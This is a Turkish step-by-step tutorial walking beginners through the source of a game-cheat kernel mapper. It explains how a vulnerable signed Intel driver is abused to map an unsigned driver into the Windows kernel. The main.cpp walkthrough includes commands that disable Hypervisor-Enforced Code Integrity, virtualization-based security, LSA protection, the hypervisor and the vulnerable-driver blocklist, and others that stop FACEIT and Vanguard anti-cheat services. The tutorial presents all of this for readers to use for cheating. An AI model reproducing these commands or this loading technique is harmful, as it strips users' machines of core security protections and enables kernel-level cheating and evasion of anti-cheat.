# C2C Kernel Mapper - Komple ve En Detaylı Kod Rehberi
## Sıfır Bilgiyle Başlayanlar İçin Adım Adım, Kelime Kelime Açıklama

---

# ÖNSÖZ: BU REHBERİ KİM OKUMALI?

Sevgili okuyucu, bu rehberi yazarken senin hakkında hiçbir varsayımda bulunmadım. Bilgisayarın ne olduğunu yeni öğreniyor olabilirsin, daha önce hiç programlama yapmamış olabilirsin, "kod" kelimesini ilk defa duyuyor olabilirsin. Hiç önemli değil. Bu rehber, eline ilk defa bir bilgisayar almış birine bile kernel mapping'in ne olduğunu, nasıl çalıştığını ve neden yapıldığını anlatacak şekilde yazıldı.

Önce sana bilgisayarın temel mantığından bahsedeceğim. Sonra programlamanın ne olduğunu, C++ dilinin nasıl çalıştığını anlatacağım. Sonra Windows işletim sisteminin iç yapısına gireceğiz. En son olarak da bu projenin her bir dosyasını, her bir satırını, her bir kelimesini tek tek açıklayacağım. Sabırlı ol, acele etme. Anlamadığın bir yer olursa geri dön ve tekrar oku. Çünkü bu konu zor bir konu, ama imkansız değil.

---

# BÖLÜM 0: HİÇ BİR ŞEY BİLMİYORUM, NEREDEN BAŞLAYAYIM?

## 0.1 Bilgisayar Nasıl Çalışıyor?

Önce çok temel bir şeyden başlayalım: Bilgisayar nasıl çalışıyor? Bilgisayar dediğimiz şey aslında çok hızlı hesap yapan bir makinedir. İçinde bir **işlemci** (CPU - Central Processing Unit, yani Merkezi İşlem Birimi) ve **bellek** (RAM - Random Access Memory, yani Rastgele Erişimli Bellek) vardır.

İşlemci, bir takım talimatları (komutları) sırayla okur ve uygular. Bu talimatlar bellekte saklıdır. Yani işlemci belleğe bakar, "bir sonraki komut nedir?" diye sorar, o komutu alır, uygular, sonra bir sonraki komuta geçer. Bu işlem saniyede milyarlarca kez tekrarlanır.

Bellekte sadece talimatlar değil, aynı zamanda veriler de bulunur. Mesela bir oyun oynarken, oyuncunun canı (HP), pozisyonu (x, y, z koordinatları), envanteri gibi bilgiler bellekte saklanır. İşlemci bu verileri okur, üzerinde işlem yapar (mesela "canı 10 azalt"), ve sonucu yine belleğe yazar.

Şöyle düşün: Bellek dev bir Excel tablosu gibidir. Her hücrenin bir adresi vardır (mesela hücre A1, B5 gibi). Bilgisayarda da her bellek hücresinin bir adresi vardır, ama bu adresler sayılarla ifade edilir. Mesela bellekte 0 numaralı adres, 1 numaralı adres, 2 numaralı adres diye gider. Modern bilgisayarlarda bu adresler çok büyük sayılardır. Genelde **onaltılık (hexadecimal)** sayı sistemiyle yazılırlar. Onaltılık sistem, 0-9 ve A-F harflerini kullanır. Yani 10 yerine A, 11 yerine B, 15 yerine F yazılır. 16 sayısı ise "10" olarak yazılır (16'lık sistemde).

Bir adres genelde şöyle gösterilir: `0x140000000`. Buradaki `0x` öneki, bu sayının onaltılık olduğunu söyler. Yani bu sayı, normal sayı sisteminde 5,368,709,120 demektir. Çok büyük bir sayı, değil mi? İşte modern bilgisayarlar bu kadar büyük adresleri kullanabilir.

## 0.2 İşletim Sistemi Nedir?

Şimdi düşün ki bilgisayarı yeni aldın ve içine hiçbir şey yüklü değil. Sadece donanım var. Bu donanımı nasıl kullanacaksın? Klavyenin tuşlarına bastığında ne olacak? Ekrana nasıl bir şey çizdireceksin? Dosyaları nereye saklayacaksın?

İşte bu noktada **işletim sistemi** (OS - Operating System) devreye girer. İşletim sistemi, donanımla senin uygulamaların arasında bir köprü görevi görür. Senin yerine donanımla konuşur. Mesela sen bir dosya açmak istediğinde, işletim sistemine "şu dosyayı aç" dersin, o da disk sürücüsüne gidip dosyayı bulur ve sana getirir.

En yaygın işletim sistemleri Windows, macOS ve Linux'tur. Bu projede biz Windows ile uğraşacağız.

İşletim sisteminin de bir **çekirdeği** (kernel) vardır. Kernel, işletim sisteminin en derin, en temel kısmıdır. Donanımla doğrudan konuşan, sistem güvenliğini sağlayan, bellek yönetimini yapan kısım kernel'dir. Senin yazdığın programlar (Notepad, Chrome, oyunlar) kernel'in dışında, "kullanıcı modunda" (user mode) çalışır. Kernel ise kendi özel alanında, "kernel modunda" (kernel mode) çalışır.

## 0.3 Programlama ve Kod Nedir?

**Programlama**, bilgisayara ne yapacağını söylemektir. Bilgisayar Türkçe veya İngilizce anlamaz, sadece sayılarla ifade edilen makine kodu anlar. Ama makine kodunu yazmak çok zordur. Bu yüzden insanlar **programlama dilleri** icat etmiştir. Bu diller, insanların anlayabileceği şekilde yazılır, sonra bir program (derleyici - compiler) bu kodu makine koduna çevirir.

C++ da bir programlama dilidir. Bu projede biz C++ kullanacağız. C++ ile yazılan kod, bir derleyici tarafından makine koduna çevrilir ve bilgisayar tarafından çalıştırılır.

Bir C++ kodu şöyle görünür:

```cpp
int sayi = 5;
sayi = sayi + 3;
```

Burada birinci satırda `sayi` adında bir **değişken** (variable) oluşturuyoruz ve içine 5 koyuyoruz. `int` kelimesi, bu değişkenin **tamsayı** (integer) tipinde olduğunu söyler. İkinci satırda ise `sayi` değişkeninin değerini 3 artırıyoruz. Yani `sayi` artık 8 oldu.

Değişkenler aslında bellekte bir hücreyi temsil eder. `sayi = 5` dediğimizde, bilgisayar belleğin bir yerini bulur, oraya 5 yazar, ve "şu adres `sayi` olarak bilinsin" der. Sonra `sayi + 3` dediğimizde, o adresteki değeri okur, 3 ekler ve sonucu tekrar oraya yazar.

## 0.4 C++ Hakkında Temel Şeyler

Bu projede çok C++ kodu göreceksin. Bu yüzden temel bazı şeyleri açıklayayım.

**Veri tipleri (Data types):** Bir değişkenin nasıl bir veri tutacağını belirten şey. Mesela:
- `int`: Tam sayı (mesela 5, -3, 100)
- `bool`: Doğru/Yanlış değeri (true/false)
- `char`: Tek bir karakter (mesela 'a', 'B', '7')
- `float`, `double`: Ondalıklı sayı (mesela 3.14, 2.5)
- `void*`: Herhangi bir bellek adresini gösteren pointer

**Pointer (İşaretçi) Nedir?** Bu çok önemli! Bir pointer, bir bellek adresini tutan değişkendir. Yani değerin kendisini değil, değerin **nerede olduğunu** tutar. Şöyle düşün: bir kitabın içeriğini değil, kitabın kütüphanedeki yerini söyleyen bir not. Pointer'lar `*` işareti ile gösterilir. Mesela:

```cpp
int x = 5;        // x adında bir tamsayı, değeri 5
int* p = &x;      // p adında bir pointer, x'in adresini tutuyor
```

Buradaki `&` işareti, "şunun adresini ver" demek. `int*` ise "tamsayıya işaret eden pointer" demek. `p`'nin değeri, x'in bellekteki adresidir (mesela 0x7FFE1234 gibi bir şey).

Pointer'ı kullanırken, içindeki değere ulaşmak için `*` işareti kullanırız:

```cpp
*p = 10;          // p'nin işaret ettiği yere (yani x'e) 10 yaz
                  // Artık x = 10
```

**Fonksiyon nedir?** Belirli bir işi yapan kod parçacığıdır. Şöyle yazılır:

```cpp
int Topla(int a, int b) {
    int sonuc = a + b;
    return sonuc;
}
```

Bu fonksiyonun adı `Topla`. İki tane parametre alıyor (`a` ve `b`, ikisi de tamsayı). İçinde bu ikisini topluyor ve sonucu **döndürüyor** (return ediyor). Başındaki `int`, bu fonksiyonun bir tamsayı döndüreceğini söyler.

Bu fonksiyonu çağırmak için:

```cpp
int x = Topla(3, 5);  // x artık 8 olur
```

**Struct (Yapı) nedir?** Birden fazla değişkeni bir araya getirerek oluşturulan bir tiptir. Mesela bir oyuncunun bilgilerini tutmak için:

```cpp
struct Oyuncu {
    int can;
    int kalkan;
    float x_pozisyon;
    float y_pozisyon;
};

Oyuncu oyuncu1;
oyuncu1.can = 100;
oyuncu1.kalkan = 50;
```

Yani `Oyuncu` adında bir tip oluşturduk, içinde 4 tane değişken var. Sonra `oyuncu1` adında bir `Oyuncu` oluşturduk ve değerlerini ayarladık. Erişmek için `.` (nokta) kullanıyoruz.

**Pointer ile struct'a erişim:** Eğer pointer ile struct'a erişiyorsan `->` operatörünü kullanırsın:

```cpp
Oyuncu* p = &oyuncu1;
p->can = 100;      // (*p).can = 100 ile aynı şey
```

Bunlar temel şeyler. Daha fazlasını ilerledikçe öğreneceksin. Şimdi gerçek konumuza geçelim.

---

# BÖLÜM 1: KERNEL MAPPER NEDİR VE NEDEN GEREKLİDİR?

## 1.1 Kullanıcı Modu ve Çekirdek Modu

Daha önce bahsettim, ama şimdi daha detaylı anlatacağım. Modern işlemciler, çalışan kodu farklı **ayrıcalık seviyelerinde** (privilege levels) çalıştırır. Bu seviyeler "Ring" olarak adlandırılır ve genelde 4 tanedir: Ring 0, Ring 1, Ring 2, Ring 3. Ama Windows pratikte sadece Ring 0 ve Ring 3'ü kullanır.

**Ring 3 (Kullanıcı Modu - User Mode):** Senin normal uygulamalarının çalıştığı yer. Notepad, Chrome, oyunlar buradadır. Bu modda çalışan kod sınırlıdır. Mesela başka uygulamaların belleğine erişemez, donanıma doğrudan dokunamaz. Eğer hata yaparsa, sadece o uygulama çöker, bilgisayar çalışmaya devam eder.

**Ring 0 (Çekirdek Modu - Kernel Mode):** İşletim sisteminin çekirdeği ve donanım sürücüleri (driver'lar) burada çalışır. Bu modda çalışan kodun her şeye erişimi vardır. Tüm belleği okuyabilir, donanımı doğrudan kontrol edebilir. Ama eğer hata yaparsa, tüm sistem çöker (mavi ekran - BSOD - Blue Screen of Death).

Şimdi bir oyun düşün. Oyun Ring 3'te çalışıyor. Senin yazdığın bir hile programı da Ring 3'te çalışıyor. Sen oyunun belleğini okumak istiyorsun (mesela düşmanın pozisyonunu öğrenmek için). Ama Windows izin vermiyor. Çünkü Ring 3'te bir uygulama, başka bir uygulamanın belleğini doğrudan okuyamaz. Bu güvenlik için.

**Çözüm nedir?** Ring 0'da çalışan bir kod yazmak. Ring 0'daki kod tüm belleği okuyabilir. Ama Ring 0'da kod çalıştırmak için ne yapman gerekiyor? **Driver yazman** (sürücü yazman) gerekiyor. Driver'lar Ring 0'da çalışır.

Ama burada başka bir sorun var: Windows, herhangi bir driver'ı yüklemene izin vermez. Microsoft tarafından **imzalanmış** (signed) driver'ları kabul eder. İmzasız bir driver yüklemeye kalkarsan, Windows "Bu driver güvenli değil, yüklemiyorum" der ve iptal eder.

İşte bu noktada **Kernel Mapping** devreye girer.

## 1.2 Kernel Mapping (Çekirdek Eşleme) Nedir?

Kernel mapping, imzasız bir driver'ı, Windows'a haber vermeden, doğrudan çekirdek belleğine yükleme tekniğidir. Yani Windows'un imza kontrolünü atlatıp, kendi driver'ımızı çekirdekte çalıştırırız.

Bunu nasıl yaparız? Şöyle:

1. **İmzalı, ama hatalı bir driver buluruz.** Internette böyle driver'lar var. Mesela Intel'in eski bir driver'ı (iqvw64e.sys) güvenlik açığı içerir. Bu driver imzalı olduğu için Windows yüklenmesine izin verir.

2. **Bu driver'ı yükleriz** (Windows izin verir, çünkü imzalı).

3. **Bu driver'daki güvenlik açığını kullanarak çekirdek belleğine yazma yetkisi alırız.**

4. **Kendi driver'ımızı, çekirdek belleğine "elle" yazarız.** Yani Windows'un normal yükleme mekanizmasını kullanmadan, bellekte hazır hale getirip, sonra çalıştırırız.

5. **Sonra Intel driver'ı kaldırırız.** İşimiz bitti.

Bu projede tam olarak bunu yapıyoruz. C2C kernel mapper, imzasız bir driver'ı (kendi yazdığımız driver'ı) çekirdeğe yükler.

## 1.3 Bu Projenin Dosyaları

Projede şu dosyalar var. Hangisinin ne yaptığını kısaca açıklayayım, sonra her birini detaylı inceleyeceğiz.

```
kernel/
├── main.cpp                          → Programın başladığı dosya
├── kdmapper.cpp                      → Asıl mapping işini yapan kod
├── intel_driver.cpp                  → Intel driver ile konuşan kod
├── service.cpp                       → Driver'ı registry'ye kaydeden kod
├── utils.cpp                         → Yardımcı fonksiyonlar
├── portable_executable.cpp           → PE dosya formatını okuyan kod
│
├── include/
│   ├── kdmapper.h                    → kdmapper.cpp'nin header'ı
│   ├── intel_driver.h                → intel_driver.cpp'nin header'ı
│   ├── portable_executable.h         → PE struct'ları
│   ├── nt.h                          → Windows NT API tanımları
│   ├── service.h                     → service.cpp'nin header'ı
│   ├── utils.h                       → utils.cpp'nin header'ı
│   ├── logger.h                      → Renkli log fonksiyonları
│   ├── cfg.h                         → Şifrelenmiş driver ve anahtar
│   ├── crypto.h                      → Şifreleme fonksiyonu
│   ├── web_api.h                     → İnternet istekleri
│   └── intel_driver_resource.h       → Intel driver binary'si
```

`.cpp` dosyaları gerçek kodu içerir. `.h` (header) dosyaları ise tanımları içerir, başka dosyalardan kullanılabilmesi için. Bu C++ projelerinde yaygın bir uygulamadır.

---

# BÖLÜM 2: main.cpp - HER ŞEYİN BAŞLADIĞI YER

## 2.1 main.cpp'nin Genel Amacı

Her C++ programının bir başlangıç noktası vardır. Bu nokta genelde `main()` adında bir fonksiyondur. Sen programı çalıştırdığında, işletim sistemi `main()` fonksiyonunu çağırır ve programın çalışması buradan başlar.

Bu projede `wmain()` fonksiyonu var. Sondaki `w` harfi, "wide character" (geniş karakter) anlamına gelir. Yani Unicode karakterleri (Türkçe karakterler, Çince karakterler vb.) destekleyen bir versiyondur. Normal `main()` sadece ASCII karakterleri destekler.

main.cpp dosyasının yaptığı işler:

1. Komut satırından gelen parametreleri okur (kullanıcı `/securemode` yazdı mı vs.)
2. Programın çökme durumunda ne yapacağını ayarlar
3. Driver zaten yüklü mü kontrol eder
4. Windows'un güvenlik ayarlarını kontrol eder ve gerekirse değiştirir
5. Şifrelenmiş driver dosyasının şifresini çözer
6. Intel driver'ı yükler
7. Kendi driver'ımızı kernel'e map eder
8. Temizlik yapar ve çıkar

Şimdi her satırı tek tek inceleyelim.

## 2.2 Dosyanın En Üstündeki Kısım: include'lar

Dosyanın en üstünde şunları görüyoruz:

```cpp
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <sstream>
#include <TlHelp32.h>
#include "json.hpp"
```

Bu satırların başındaki `#include` ifadesi, derleyiciye "şu dosyayı da bu dosyaya dahil et" demek. Yani başka dosyalarda yazılmış kodu kendi kodumuzda kullanabilmek için onları dahil ediyoruz.

`<Windows.h>`: Windows işletim sisteminin sunduğu fonksiyonların tanımları. Mesela `CreateFile`, `RegOpenKeyEx` gibi fonksiyonlar buradan gelir.

`<iostream>`: "Input/Output Stream" yani giriş/çıkış akışı. Ekrana yazı yazdırmak (`std::cout`) ve klavyeden okumak (`std::cin`) için kullanılır.

`<string>`: Metin (yazı) tutmak için. C++'ta bir metin değişkeni oluşturmak için `std::string` kullanırız.

`<vector>`: Dinamik dizi. Yani büyüyüp küçülebilen bir liste. Mesela `std::vector<int>` dediğin zaman, içinde tamsayılar bulunan büyüyüp küçülebilen bir liste olur.

`<filesystem>`: Dosya ve klasör işlemleri için.

`<sstream>`: "String Stream". Metinleri kolayca birleştirmek için kullanılır.

`<TlHelp32.h>`: "Tool Help 32-bit". Çalışan işlemler hakkında bilgi almak için kullanılan Windows API'sini içerir.

`"json.hpp"`: JSON formatını parse etmek (okumak) için bir kütüphane. Köşeli parantez yerine tırnak işareti kullanmak, bunun bizim kendi projemizdeki bir dosya olduğunu gösterir. Köşeli parantez sistem dosyaları için, tırnak işareti kendi dosyalarımız için kullanılır.

Sonra projeye özel header'lar var:

```cpp
#include "kdmapper.h"
#include "utils.h"
#include "intel_driver.h"
#include "cfg.h"
#include "web_api.h"
#include "logger.h"
```

Bunlar bizim kendi yazdığımız header dosyaları. Her biri farklı bir konuyla ilgili fonksiyonların tanımlarını içerir.

```cpp
using json = nlohmann::json;
```

Bu satır, `nlohmann::json` tipinin uzun adını kısaltıyor. Artık biz `nlohmann::json` yerine sadece `json` yazabiliriz. Bu kolaylık için yapılır.

## 2.3 Fonksiyon İlanları (Forward Declarations)

```cpp
bool IsDriverRunning(const LPCWSTR name);
LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo);
bool CheckCheatVersion();
bool CheckArg(const int argc, wchar_t** argv, const wchar_t* arg);
DWORD getParentProcess();
bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize);
bool CheckWindowsKernelPrefs();
```

Bu satırlar, henüz tanımlamadığımız fonksiyonların var olduğunu derleyiciye söyler. C++ derleyicisi yukarıdan aşağı kod okur. Eğer biz `wmain()` içinde `IsDriverRunning()` fonksiyonunu çağırırsak, derleyici "bu fonksiyon nedir?" diye sorar. Eğer aşağıda tanımlamışsak, derleyici onu daha bilmediği için hata verir. Bu yüzden başta "merak etme, bu fonksiyon var, aşağıda göreceksin" diyerek tanımlıyoruz.

İlk satırı inceleyelim:

```cpp
bool IsDriverRunning(const LPCWSTR name);
```

`bool`: Bu fonksiyonun döneceği değerin tipi. `bool` (boolean) sadece iki değer alabilir: `true` (doğru) veya `false` (yanlış). Yani bu fonksiyon "evet" veya "hayır" cevabı verecek.

`IsDriverRunning`: Fonksiyonun adı. "Driver çalışıyor mu?" anlamına geliyor.

`(...)`: Parantezlerin içi parametreler. Yani fonksiyona ne vereceğiz?

`const LPCWSTR name`: Tek bir parametre var. Adı `name`. Tipi `LPCWSTR`. `LPCWSTR` ne demek?
- `L`: "Long" (uzun)
- `P`: "Pointer" (işaretçi)
- `C`: "Constant" (sabit)
- `W`: "Wide" (geniş, yani Unicode)
- `STR`: "String" (yazı)

Yani `LPCWSTR`, "değişmeyen Unicode bir yazıya işaretçi" demek. `const` kelimesi ise bu parametrenin fonksiyon içinde değiştirilmeyeceğini söyler.

Diğer fonksiyonlara da kısaca bakalım:

```cpp
LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo);
```

Bu, program çöktüğünde (crash olduğunda) çağrılacak fonksiyon. `LONG` tipinde (uzun tamsayı) bir değer döndürüyor. `WINAPI` ise Windows'un nasıl çağrı yapması gerektiğini söyleyen bir özel anahtardır. `EXCEPTION_POINTERS*` ise çöküş bilgilerini içeren bir struct'a pointer.

```cpp
bool CheckArg(const int argc, wchar_t** argv, const wchar_t* arg);
```

Bu fonksiyon, komut satırı parametrelerini kontrol eder. `argc` parametre sayısı, `argv` parametre dizisi, `arg` ise aradığımız parametre.

`wchar_t**` ifadesi biraz karmaşık görünebilir. Açıklayayım:
- `wchar_t`: Tek bir Unicode karakter
- `wchar_t*`: Karakterlere işaretçi, yani bir Unicode metin
- `wchar_t**`: Metinlere işaretçi, yani metinlerin oluşturduğu bir dizi

Yani `argv`, metinlerden oluşan bir dizidir. Her metin bir komut satırı parametresidir.

## 2.4 wmain() Fonksiyonu - Programın Kalbi

Şimdi asıl kısma geliyoruz. wmain() fonksiyonu adım adım.

```cpp
int wmain(const int argc, wchar_t** argv)
{
```

`int`: Bu fonksiyon bir tamsayı döndürecek. Programlar sonlandığında bir "çıkış kodu" döndürür. 0 başarılı, başka bir sayı başarısız anlamına gelir.

`wmain`: Fonksiyonun adı. Programın başlangıç noktası.

`(const int argc, wchar_t** argv)`: İki parametre alıyor:
- `argc`: "Argument count", yani komut satırından kaç tane parametre geldiğini söyler.
- `argv`: "Argument vector", yani parametrelerin kendisi (metinler dizisi).

Mesela kullanıcı şöyle bir komut çalıştırırsa:
```
C2C-kernel.exe /securemode /legacyimg
```

Bu durumda:
- `argc` = 3
- `argv[0]` = "C2C-kernel.exe" (programın kendisi her zaman ilk parametredir)
- `argv[1]` = "/securemode"
- `argv[2]` = "/legacyimg"

Devam edelim:

```cpp
SetUnhandledExceptionFilter(SimplestCrashHandler);
```

Bu satır, program çöktüğünde ne yapılacağını ayarlıyor. `SetUnhandledExceptionFilter`, Windows'un sunduğu bir fonksiyon. "Eğer yakalanmamış bir hata olursa, şu fonksiyonu çağır" diyor. Biz de `SimplestCrashHandler` fonksiyonunu veriyoruz. Yani crash olursa, o fonksiyon çalışacak ve çöküş bilgisini ekrana yazdıracak.

**Neden böyle bir şeye ihtiyacımız var?** Çünkü kernel mapping çok riskli bir iş. Bir hata olursa programımız çökebilir. Çöktüğünde de ne olduğunu bilmek isteriz.

Devam:

```cpp
bool free = false;
bool indPagesMode = CheckArg(argc, argv, L"securemode");
bool legacyImg = CheckArg(argc, argv, L"legacyimg");
bool forcePrefs = CheckArg(argc, argv, L"forceprefs");
bool copyHeader = false;
bool passAllocationPtr = false;
```

Burada birkaç tane `bool` değişkeni oluşturuyoruz. Her biri programın nasıl çalışacağını kontrol eden bir bayrak (flag). Açıklayalım:

- `free`: Eğer `true` ise, mapping bittikten sonra kullanılan bellek serbest bırakılır. Tehlikeli, çünkü driver hemen bitmezse sorun olur.

- `indPagesMode`: Eğer `true` ise, driver bellekte parçalanmış sayfalara dağıtılır. Bu daha gizli ama daha karmaşık. Bu değer komut satırından `/securemode` parametresi gelirse `true` olur.

- `legacyImg`: Eski versiyon driver kullanılsın mı? `/legacyimg` parametresi geldiyse `true`.

- `forcePrefs`: Windows ayarları zorla değiştirilsin mi? `/forceprefs` parametresi geldiyse `true`.

- `copyHeader`: PE header'ı belleğe kopyalansın mı?

- `passAllocationPtr`: Allocate edilen bellek adresi entry point'e parametre olarak geçilsin mi?

`L"securemode"` ifadesindeki `L` öneki, bunun bir Unicode metin olduğunu söyler. Yani `L"securemode"`, geniş karakter formatında "securemode" yazısıdır.

`CheckArg` fonksiyonu, bu metnin komut satırı parametrelerinde olup olmadığını kontrol eder. Detayını sonra göreceğiz.

```cpp
if (legacyImg)
{
    Log::Info("Enabled: Legacy C2C kernel");
    Log::Warning("Legacy C2C kernel is deprecated, it's better to use new one");
}
```

`if (legacyImg)`: "Eğer `legacyImg` doğruysa" demek. C++'ta `if` bir koşul kontrolüdür. Süslü parantezlerin (`{}`) içindeki kod sadece koşul doğruysa çalışır.

`Log::Info(...)`: Bu bizim kendi yazdığımız bir fonksiyon, bilgi mesajı yazdırıyor. Çift iki nokta üst üste (`::`), bu fonksiyonun `Log` adındaki bir alanın (namespace) içinde olduğunu söyler.

`Log::Warning(...)`: Uyarı mesajı yazdırıyor.

Yani burada şunu diyoruz: Eğer kullanıcı eski driver kullanmak istiyorsa, ona "tamam, eski driver'ı etkinleştirdim" diyoruz, ama aynı zamanda "ama eski driver tavsiye edilmez, yeni olanı kullan" şeklinde uyarıyoruz.

```cpp
if (indPagesMode)
    Log::Info("Enabled: Secure mapping and execution mode");
```

Eğer secure mode aktifse, bilgilendirme yazdırıyoruz. Süslü parantez yok, çünkü tek satırlık kod var. C++'ta if'ten sonra tek satır gelirse parantez kullanmak şart değildir. Ama birden fazla satır olursa parantez gereklidir.

```cpp
if (IsDriverRunning(L"\\\\.\\C2C-kmd"))
    Log::Error("Kernel mode driver is already mapped");
```

Burada şunu kontrol ediyoruz: C2C kernel driver'ı zaten yüklü mü? Eğer yüklüyse, hata mesajı veriyoruz.

`L"\\\\.\\C2C-kmd"` bu garip metin ne? Açıklayayım. C++'ta `\` (backslash) özel bir karakter. Mesela `\n` "yeni satır" demek. Eğer gerçek bir backslash yazmak istiyorsan, çift backslash (`\\`) kullanırsın. Yani `\\\\` aslında iki backslash demektir. Yani gerçek metin `\\.\C2C-kmd`. Bu Windows'ta cihazlara erişmek için kullanılan özel bir yoldur. `\\.\` öneki, "yerel bilgisayar" demektir, sonrasında cihazın adı gelir.

`Log::Error` fonksiyonu sadece hata yazdırmakla kalmıyor, aynı zamanda programı sonlandırıyor (göreceğiz).

```cpp
#ifndef _DEBUG
    int tryCount = 0;
CHECK_VER:
    Log::Info("Checking mapper version...");
    try
    {
        bool result = CheckCheatVersion();
        // ...
    }
    catch (const std::exception& error)
    {
        // ...
    }
#endif
```

Bu kısım versiyon kontrolü yapıyor. `#ifndef _DEBUG` ifadesi, "eğer DEBUG modunda değilsek" demek. Yani sadece release (yayın) modunda bu kod çalışır. Geliştiriciler debug modunda çalıştığında versiyon kontrolüne gerek yok.

`int tryCount = 0;`: Bu deneme sayacı. İnternet bağlantı sorunlarında tekrar denemek için kullanılıyor.

`CHECK_VER:`: Bu bir **etiket** (label). Daha sonra buraya geri dönmek için kullanılıyor (`goto` ile).

`try { ... } catch (...) { ... }`: Bu **istisna yakalama** (exception handling). C++'ta bir kod hata fırlatabilir (exception throw edebilir). `try` bloğunda kod çalışır, eğer hata fırlatılırsa `catch` bloğuna düşülür.

İnternet'ten versiyon bilgisi alıyor, eğer alabilirse versiyonun destekleyip desteklemediğini kontrol ediyor.

```cpp
catch (const std::exception& error)
{
    Log::PreviousLine();
    std::string errorMsg = error.what();
    if (errorMsg.find("bad internet connection") != std::string::npos && tryCount < 3)
    {
        Log::Error(errorMsg, false);
        Log::Info("Reconnecting...");
        tryCount++;
        goto CHECK_VER;
    }
    else
        Log::Error(errorMsg);
}
```

`const std::exception& error`: Yakalanan hatayı `error` adında bir değişkenle alıyoruz. `std::exception` C++'ın temel hata sınıfı. `&` işareti referans demek (pointer'a benzer ama biraz farklı).

`error.what()`: Hatanın açıklamasını metin olarak döndürür.

`errorMsg.find("bad internet connection")`: Bu metnin içinde "bad internet connection" geçiyor mu kontrol ediyor. `find` fonksiyonu metni bulursa pozisyonu döndürür, bulamazsa `std::string::npos` döndürür.

Eğer internet bağlantı sorunu varsa ve 3 defadan az denedik, `goto CHECK_VER;` ile yukarıdaki etikete dönüp tekrar deniyoruz. `goto` C++'ta nadir kullanılır çünkü genelde kötü bir uygulama olarak görülür, ama burada kullanışlı.

```cpp
if (forcePrefs || !CheckWindowsKernelPrefs())
{
    if (!forcePrefs)
        Log::Warning("Your windows kernel preferences may lead to unexpected behavior.");
    else
        Log::Warning("Key to force preferences detected.");
    std::string response;
    do
    {
        Log::Info("Would you like to apply recomended preferences(y/n)");
        std::cout << ">>> "; std::cin >> response;
    } while (response != "y" && response != "n");
```

Burada Windows ayarları kontrol ediliyor. `||` operatörü "veya" demek. Yani "eğer `forcePrefs` doğruysa veya `CheckWindowsKernelPrefs()` yanlışsa". `!` işareti "değil" demek, yani değeri tersine çevirir.

`std::string response;`: `response` adında bir metin değişkeni oluşturuyoruz.

`do { ... } while(...)`: Bu bir döngü. İçindeki kod en az bir kere çalışır, sonra koşul doğruysa tekrar çalışır.

`std::cout << ">>> ";`: Ekrana ">>> " yazdır. `std::cout`, "console output" yani konsola çıktı demek. `<<` operatörü "akış operatörü" denir, sağdaki şeyi sola gönderir.

`std::cin >> response;`: Konsol girişinden (klavyeden) bir değer oku ve `response` değişkenine yaz. `std::cin`, "console input" yani konsoldan giriş.

`while (response != "y" && response != "n")`: Cevap "y" değilse VE "n" de değilse döngüye devam et. `&&` "ve" operatörü. `!=` "eşit değil" demek.

Yani bu döngü, kullanıcıdan "y" veya "n" cevabı alana kadar tekrar tekrar soruyor.

```cpp
if (response == "y")
{
    system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v Enabled /t REG_DWORD /d 0 /f >nul 2>&1");
    // ... daha fazla system çağrısı ...
```

Eğer cevap "y" ise, bir takım `system()` çağrıları yapıyoruz. `system()` fonksiyonu, bir sistem komutu çalıştırır (sanki komut satırında yazmışız gibi).

İlk komutu inceleyelim:
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v Enabled /t REG_DWORD /d 0 /f
```

`reg add`: Windows registry'ye değer ekleme komutu. Registry, Windows'un ayarlarının saklandığı veritabanıdır.

`HKLM\SYSTEM\...`: Registry'deki adres. `HKLM` "HKEY_LOCAL_MACHINE" demek, makine geneline ait ayarlar.

`/v Enabled`: "Enabled" adında bir değer.

`/t REG_DWORD`: Değerin tipi DWORD (32-bit tamsayı).

`/d 0`: Değer 0 olsun.

`/f`: Onay sorma, zorla yap.

`>nul 2>&1`: Çıktıyı gizle. `>nul` standart çıktıyı çöpe at, `2>&1` hata çıktısını da standart çıktıya yönlendir (yani o da çöpe gider).

Bu komut "Hypervisor Enforced Code Integrity" özelliğini kapatıyor. Bu özellik açıkken Windows, çekirdekte yalnızca imzalı kodu çalıştırır. Kapatınca biz kendi kodumuzu yükleyebiliriz.

Diğer komutlar da benzer şekilde Windows güvenlik özelliklerini kapatıyor:
- `RunAsPPL`: Protected Process Light özelliğini kapatır.
- `EnableVirtualizationBasedSecurity`: Sanallaştırma tabanlı güvenliği kapatır.
- `bcdedit /set hypervisorlaunchtype off`: Hypervisor'ı kapatır.
- `VulnerableDriverBlocklistEnable`: Zayıf driver engelleme listesini kapatır.
- `sc stop faceit/vgc/vgk`: Anti-cheat servislerini durdurur.

Sonra:

```cpp
Log::Fine("Recomended preferences applied, pls restart your pc");
Log::Info("Ignore usermode-part mapper error, just reboot pc and run again");
system("pause");
return -1;
```

Ayarlar uygulandıktan sonra kullanıcıya bilgisayarı yeniden başlatmasını söylüyoruz. Çünkü bu ayarların etkili olması için reboot gerekir. `system("pause")` "bir tuşa basın" diyerek bekler. Sonra `-1` döndürerek programdan çıkıyoruz.

```cpp
BYTE* img = nullptr;
if (!legacyImg)
{
    if (cfg::image.empty())
        Log::Error("Driver image is empty");
    RollingVectorProcedure(cfg::image, cfg::key);
    img = cfg::image.data();
}
else
{
    if (cfg::imageLegacy.empty())
        Log::Error("Driver image is empty");
    RollingVectorProcedure(cfg::imageLegacy, cfg::key);
    img = cfg::imageLegacy.data();
}
```

`BYTE* img = nullptr;`: `BYTE`, 8-bit (1 byte) tamsayı. `BYTE*` yani byte'lara işaretçi. `nullptr` ise "boş pointer" demek, henüz hiçbir yere işaret etmiyor.

Yani `img`, driver dosyamızın ilk byte'ına işaret edecek bir pointer. Şimdilik boş.

`if (!legacyImg)`: Eğer eski driver KULLANILMIYORSA (çünkü `!` tersine çeviriyor).

`cfg::image.empty()`: `cfg` namespace'indeki `image` değişkeninin boş olup olmadığını kontrol eder. `cfg::image`, şifrelenmiş driver binary'sini içerir.

